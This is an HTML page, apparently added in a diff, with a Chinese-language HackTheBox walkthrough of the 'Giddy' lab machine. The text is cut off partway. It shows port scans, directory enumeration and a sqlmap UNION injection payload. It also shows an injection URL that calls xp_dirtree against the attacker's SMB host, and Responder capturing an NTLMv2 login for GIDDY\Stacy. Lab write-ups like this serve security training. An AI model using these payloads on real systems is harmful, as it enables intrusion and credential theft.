@@ -1,0 +1,686 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556Crazyinside:~&#x2F;HackTheBox$ sudo rustscan -r 1-65535 --ulimit 5000 --no-nmap 10.10.10.104.----. .-.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Giddy">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTHeBox-Giddy.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556Crazyinside:~&#x2F;HackTheBox$ sudo rustscan -r 1-65535 --ulimit 5000 --no-nmap 10.10.10.104.----. .-.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816195445842.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816195843081.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816200424856.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816200501165.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816214441074.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.009Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.029Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816195445842.png">
+  
+  
+  
+  <title>HTB Walkthrough - Giddy - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Giddy"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          135 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Giddy</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HackTheBox$ sudo rustscan -r 1-65535 --<span class="built_in">ulimit</span> 5000 --no-nmap 10.10.10.104</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-<span class="string">&#x27; `-&#x27;</span>`-----<span class="string">&#x27;`----&#x27;</span>  `-<span class="string">&#x27;  `----&#x27;</span>  `---<span class="string">&#x27; `-&#x27;</span>  `-<span class="string">&#x27;`-&#x27;</span> `-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Faster Nmap scanning with Rust.</span></span><br><span class="line"><span class="string">________________________________________</span></span><br><span class="line"><span class="string">: https://discord.gg/GFrQsGy           :</span></span><br><span class="line"><span class="string">: https://github.com/RustScan/RustScan :</span></span><br><span class="line"><span class="string"> --------------------------------------</span></span><br><span class="line"><span class="string">😵 https://admin.tryhackme.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span></span><br><span class="line"><span class="string">[~] Automatically increasing ulimit value to 5000.</span></span><br><span class="line"><span class="string">Open 10.10.10.104:80</span></span><br><span class="line"><span class="string">Open 10.10.10.104:443</span></span><br><span class="line"><span class="string">Open 10.10.10.104:3389</span></span><br><span class="line"><span class="string">Open 10.10.10.104:5985</span></span><br><span class="line"><span class="string">10.10.10.104 -&gt; [80,443,3389,5985]</span></span><br><span class="line"><span class="string">Crazyinside:~/HackTheBox$ sudo nmap -sCV -Pn -p1-10000 10.10.10.104</span></span><br><span class="line"><span class="string">[sudo] crayzinside 的密码：</span></span><br><span class="line"><span class="string">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-16 17:25 CST</span></span><br><span class="line"><span class="string">Nmap scan report for 10.10.10.104</span></span><br><span class="line"><span class="string">Host is up (0.25s latency).</span></span><br><span class="line"><span class="string">Not shown: 9989 filtered tcp ports (no-response), 7 filtered tcp ports (host-unreach)</span></span><br><span class="line"><span class="string">PORT     STATE SERVICE       VERSION</span></span><br><span class="line"><span class="string">80/tcp   open  http          Microsoft IIS httpd 10.0</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-IIS/10.0</span></span><br><span class="line"><span class="string">| http-methods: </span></span><br><span class="line"><span class="string">|_  Potentially risky methods: TRACE</span></span><br><span class="line"><span class="string">|_http-title: IIS Windows Server</span></span><br><span class="line"><span class="string">443/tcp  open  ssl/http      Microsoft IIS httpd 10.0</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-IIS/10.0</span></span><br><span class="line"><span class="string">| tls-alpn: </span></span><br><span class="line"><span class="string">|   h2</span></span><br><span class="line"><span class="string">|_  http/1.1</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-08-16T09:29:18+00:00; 0s from scanner time.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite</span></span><br><span class="line"><span class="string">| Not valid before: 2018-06-16T21:28:55</span></span><br><span class="line"><span class="string">|_Not valid after:  2018-09-14T21:28:55</span></span><br><span class="line"><span class="string">|_http-title: IIS Windows Server</span></span><br><span class="line"><span class="string">| http-methods: </span></span><br><span class="line"><span class="string">|_  Potentially risky methods: TRACE</span></span><br><span class="line"><span class="string">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-08-16T09:29:18+00:00; 0s from scanner time.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=Giddy</span></span><br><span class="line"><span class="string">| Not valid before: 2022-08-15T09:23:46</span></span><br><span class="line"><span class="string">|_Not valid after:  2023-02-14T09:23:46</span></span><br><span class="line"><span class="string">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-title: Not Found</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 210.29 seconds</span></span><br><span class="line"><span class="string">zsh: segmentation fault  sudo nmap -sCV -Pn -p1-10000 10.10.10.104</span></span><br></pre></td></tr></table></figure>
+
+<p>80页面一个IIS默认页面被替换成了一只乘车将头探出窗外吹风的狗：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816195445842.png" srcset="/img/loading.gif" lazyload alt="image-20220816195445842"></p>
+<p>feroxbuster用来枚举目录是一个很好的工具，它默认会进行递归枚举：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HackTheBox$ feroxbuster -u http://10.10.10.104/ </span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://10.10.10.104/</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.7.0</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">200      GET       32l       55w      700c http://10.10.10.104/</span><br><span class="line">301      GET        2l       10w      157c http://10.10.10.104/aspnet_client =&gt; http://10.10.10.104/aspnet_client/</span><br><span class="line">302      GET        3l        8w      157c http://10.10.10.104/remote =&gt; /Remote/default.aspx?ReturnUrl=%2fremote</span><br><span class="line">301      GET        2l       10w      157c http://10.10.10.104/Aspnet_client =&gt; http://10.10.10.104/Aspnet_client/</span><br><span class="line">301      GET        2l       10w      147c http://10.10.10.104/mvc =&gt; http://10.10.10.104/mvc/</span><br><span class="line">301      GET        2l       10w      154c http://10.10.10.104/mvc/images =&gt; http://10.10.10.104/mvc/images/</span><br><span class="line">301      GET        2l       10w      155c http://10.10.10.104/mvc/scripts =&gt; http://10.10.10.104/mvc/scripts/</span><br><span class="line">301      GET        2l       10w      155c http://10.10.10.104/mvc/content =&gt; http://10.10.10.104/mvc/content/</span><br><span class="line">301      GET        2l       10w      155c http://10.10.10.104/mvc/Scripts =&gt; http://10.10.10.104/mvc/Scripts/</span><br><span class="line">301      GET        2l       10w      155c http://10.10.10.104/mvc/account =&gt; http://10.10.10.104/mvc/account/</span><br><span class="line">301      GET        2l       10w      154c http://10.10.10.104/mvc/Images =&gt; http://10.10.10.104/mvc/Images/</span><br><span class="line">301      GET        2l       10w      162c http://10.10.10.104/mvc/content/themes =&gt; http://10.10.10.104/mvc/content/themes/</span><br></pre></td></tr></table></figure>
+
+<p>443端口与80端口是一样的狗：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816195843081.png" srcset="/img/loading.gif" lazyload alt="image-20220816195843081"></p>
+<p>大概能够猜出来，80与443为同一个站点，再暂不考虑端口漏扫的情况下，那只有枚举目录了，但我猜443与80路径也一样。一个是加密一个不加密而已。</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816200424856.png" srcset="/img/loading.gif" lazyload alt="image-20220816200424856"></p>
+<p>可以自己注册一个账户，页面没什么好稀奇的，但是似乎有SQL注入：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816200501165.png" srcset="/img/loading.gif" lazyload alt="image-20220816200501165"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HackTheBox$ sqlmap -u <span class="string">&quot;https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=19&quot;</span> --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.6.7#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [(]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 20:05:33 /2022-08-16/</span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 25 columns</span></span><br><span class="line"><span class="string">    Payload: ProductSubCategoryId=19 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(113)+CHAR(82)+CHAR(118)+CHAR(101)+CHAR(72)+CHAR(65)+CHAR(71)+CHAR(118)+CHAR(116)+CHAR(121)+CHAR(68)+CHAR(78)+CHAR(118)+CHAR(122)+CHAR(84)+CHAR(116)+CHAR(102)+CHAR(84)+CHAR(121)+CHAR(84)+CHAR(122)+CHAR(107)+CHAR(73)+CHAR(73)+CHAR(65)+CHAR(111)+CHAR(110)+CHAR(107)+CHAR(67)+CHAR(80)+CHAR(109)+CHAR(76)+CHAR(114)+CHAR(122)+CHAR(79)+CHAR(84)+CHAR(88)+CHAR(121)+CHAR(74)+CHAR(98)+CHAR(83)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hvhE</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:07:45] [INFO] testing Microsoft SQL Server</span></span><br><span class="line"><span class="string">[20:07:46] [INFO] confirming Microsoft SQL Server</span></span><br><span class="line"><span class="string">[20:07:54] [INFO] the back-end DBMS is Microsoft SQL Server</span></span><br><span class="line"><span class="string">web server operating system: Windows 2016 or 10 or 2019</span></span><br><span class="line"><span class="string">web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET</span></span><br><span class="line"><span class="string">back-end DBMS: Microsoft SQL Server 2016</span></span><br><span class="line"><span class="string">[20:07:54] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 23 times</span></span><br><span class="line"><span class="string">[20:07:54] [INFO] fetched data logged to text files under &#x27;/home/crayzinside/.local/share/sqlmap/output/10.10.10.104&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[20:08:47] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2016 or 10 or 2019</span><br><span class="line">web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2016</span><br><span class="line">[20:08:47] [INFO] fetching database names</span><br><span class="line">[20:08:49] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] Injection</span><br><span class="line">[*] master</span><br><span class="line">[*] model</span><br><span class="line">[*] msdb</span><br><span class="line">[*] tempdb</span><br><span class="line"></span><br><span class="line">[20:08:49] [INFO] fetched data logged to text files under <span class="string">&#x27;/home/crayzinside/.local/share/sqlmap/output/10.10.10.104&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 20:08:49 /2022-08-16/</span><br></pre></td></tr></table></figure>
+
+<p>数据库里边没什么东西，但是目标是一个windows操作系统，可能会有哈希泄露：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.16.3\<span class="built_in">test</span>%22;%20--</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HackTheBox$ sudo responder -I tun0   </span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Patreon -&gt; https://www.patreon.com/PythonResponder</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Force ESS downgrade        [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.16.3]</span><br><span class="line">    Responder IPv6             [dead:beef:4::1001]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string">    Responder Machine Name     [WIN-ADETZ3Y8WYX]</span></span><br><span class="line"><span class="string">    Responder Domain Name      [EW4R.LOCAL]</span></span><br><span class="line"><span class="string">    Responder DCE-RPC Port     [48071]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Listening for events...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[SMB] NTLMv2-SSP Client   : 10.10.10.104</span></span><br><span class="line"><span class="string">[SMB] NTLMv2-SSP Username : GIDDY\Stacy</span></span><br><span class="line"><span 